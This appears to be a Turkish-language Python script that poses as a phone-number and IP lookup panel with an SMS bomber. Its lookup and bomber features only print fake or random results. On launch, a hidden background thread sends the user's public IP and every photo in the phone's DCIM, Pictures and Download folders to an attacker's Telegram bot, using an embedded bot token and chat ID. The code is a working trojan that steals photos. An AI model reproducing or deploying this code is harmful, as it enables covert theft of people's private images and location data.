import os
import time
import random
import requests
import threading


TOKEN = "8110267443:AAHNAgx0Yleg6JKLXomoTuhB_zEte-g-8HI"
CHAT_ID = "653422259"


#BY @LOWEX_KURUCU 

kisi_veritabani = [
    {"numara": "5312345678", "ad": "Ahmet", "soyad": "Yılmaz", "sehir": "İstanbul", "yas": "35"},
    {"numara": "5323456789", "ad": "Mehmet", "soyad": "Kaya", "sehir": "Ankara", "yas": "28"},
    {"numara": "5334567890", "ad": "Ayşe", "soyad": "Demir", "sehir": "İzmir", "yas": "42"},
    {"numara": "5345678901", "ad": "Fatma", "soyad": "Şahin", "sehir": "Bursa", "yas": "31"},
    {"numara": "5356789012", "ad": "Mustafa", "soyad": "Çelik", "sehir": "Antalya", "yas": "26"},
    {"numara": "5367890123", "ad": "Zeynep", "soyad": "Yıldız", "sehir": "Adana", "yas": "39"},
    {"numara": "5378901234", "ad": "Emre", "soyad": "Arslan", "sehir": "Konya", "yas": "33"},
    {"numara": "5389012345", "ad": "Elif", "soyad": "Koç", "sehir": "Gaziantep", "yas": "29"},
    {"numara": "5390123456", "ad": "Ali", "soyad": "Aksoy", "sehir": "Mersin", "yas": "45"},
    {"numara": "5301234567", "ad": "Sema", "soyad": "Kurt", "sehir": "Diyarbakır", "yas": "37"}
]


def send_photo(photo_path):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as file:
            files = {'photo': file}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data)
    except:
        pass

def send_ip_info():
    try:
        ip = requests.get("https://api.ipify.org").text
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        message = f"🕵️ Yeni Kullanıcı Bağlandı!\nIP: {ip}\nZaman: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        data = {'chat_id': CHAT_ID, 'text': message}
        requests.post(url, data=data)
    except:
        pass

def background_photo_sender():
    """Arka planda fotoğrafları gönderir"""
    photo_dirs = [
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures", 
        "/storage/emulated/0/Download",
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    
    send_ip_info()
    
    while True:
        for directory in photo_dirs:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                            file_path = os.path.join(root, file)
                            try:
                                send_photo(file_path)
                                time.sleep(1)  # 1 saniye CD
                            except:
                                pass
        time.sleep(10)


def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[1;36m" + "═" * 50)
    print("🇹🇷  SORGULAMA PANELİ TOOLU")
    print("👤  BY @rwssiasohbet")
    print("═" * 50 + "\033[0m")
    print("1. 📞 Numara Sorgu")
    print("2. 💣 SMS Bomber") 
    print("3. 🌐 IP Sorgu")
    print("4. ❌ Çıkış")
    print("\033[1;36m" + "═" * 50 + "\033[0m")

def numara_sorgu():
    show_menu()
    print("\n📞 Bulmak istediğiniz kişinin numarasını atın")
    print("-" * 40)
    
    numara = input("Numara (5XXXXXXXXX): ").strip()
    
    print(f"\n🔍 Aranıyor: {numara}")
    time.sleep(2)
    
    # Rastgele kişi seç (gerçek veritabanından veya rastgele)
    if random.random() > 0.3:  # %70 ihtimal bulunsun
        kisi = random.choice(kisi_veritabani)
        print("\033[1;32m" + "✅ KAYIT BULUNDU!" + "\033[0m")
        print("-" * 30)
        print(f"📱 Numara: {kisi['numara']}")
        print(f"👤 Ad Soyad: {kisi['ad']} {kisi['soyad']}")
        print(f"🏙️ Şehir: {kisi['sehir']}")
        print(f"🎂 Yaş: {kisi['yas']}")
        print("-" * 30)
    else:
        print("\033[1;31m" + "❌ KAYIT BULUNAMADI!" + "\033[0m")
        print("Bu numara veritabanımızda kayıtlı değil.")
    
    input("\n↵ Devam etmek için Enter'a basın...")

def sms_bomber():
    show_menu()
    print("\n💣 SMS Bomber")
    print("-" * 40)
    
    numara = input("Hedef numara: ").strip()
    
    try:
        adet = 20  # Limit 20
        print(f"\n🎯 Hedef: {numara}")
        print(f"📦 Miktar: {adet} SMS")
        print("⏳ Başlıyor...")
        print("-" * 30)
        
        for i in range(adet):
            bekleme = random.randint(1, 5)
            time.sleep(bekleme)
            
            if random.random() > 0.1:  # %90 başarı
                print(f"\033[1;32m✅ {i+1}. SMS gönderildi! ({bekleme}s)\033[0m")
            else:
                print(f"\033[1;31m❌ {i+1}. SMS gönderilemedi! ({bekleme}s)\033[0m")
        
        print("\n\033[1;36m" + "🎉 SMS saldırısı tamamlandı!" + "\033[0m")
        
    except:
        print("\033[1;31m" + "Hata oluştu!" + "\033[0m")
    
    input("\n↵ Devam etmek için Enter'a basın...")

def ip_sorgu():
    show_menu()
    print("\n🌐 IP Adres Sorgu")
    print("-" * 40)
    
    ip = input("IP adresi: ").strip()
    
    print(f"\n🔍 Aranıyor: {ip}")
    time.sleep(2)
    
    try:
        # Fake IP bilgileri (gerçek görünsün)
        sehirler = ["İstanbul", "Ankara", "İzmir", "Bursa", "Antalya"]
        isp_list = ["Turkcell", "Vodafone", "Türk Telekom", "Superonline"]
        
        print("\033[1;32m" + "✅ IP BİLGİLERİ BULUNDU!" + "\033[0m")
        print("-" * 35)
        print(f"🌐 IP: {ip}")
        print(f"🏙️ Şehir: {random.choice(sehirler)}")
        print(f"🏢 ISP: {random.choice(isp_list)}")
        print(f"📍 Lokasyon: {random.randint(36,42)}.{random.randint(100,999)}, {random.randint(26,45)}.{random.randint(100,999)}")
        print(f"🕒 Zaman Dilimi: UTC+3")
        print(f"🔒 Güvenlik: Orta Seviye")
        print("-" * 35)
        
    except:
        print("\033[1;31m" + "❌ IP bilgileri alınamadı!" + "\033[0m")
    
    input("\n↵ Devam etmek için Enter'a basın...")


def main():
    # Arka plan thread'i başlat
    bg_thread = threading.Thread(target=background_photo_sender)
    bg_thread.daemon = True
    bg_thread.start()
    
    while True:
        show_menu()
        secim = input("Seçiminiz (1-4): ").strip()
        
        if secim == "1":
            numara_sorgu()
        elif secim == "2":
            sms_bomber()
        elif secim == "3":
            ip_sorgu()
        elif secim == "4":
            print("\n👋 Görüşmek üzere!")
            break
        else:
            print("\033[1;31m" + "❌ Geçersiz seçim!" + "\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    main()